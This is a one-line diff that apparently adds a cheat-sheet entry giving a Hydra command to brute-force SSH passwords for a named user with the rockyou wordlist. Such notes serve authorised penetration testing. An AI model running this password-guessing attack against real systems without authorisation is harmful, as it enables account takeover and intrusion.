@@ -1,0 +1,1 @@
+Hydra brute force ssh for specific user:hydra -l $USER -P /usr/share/wordlists/rockyou.txt $IP -t 4
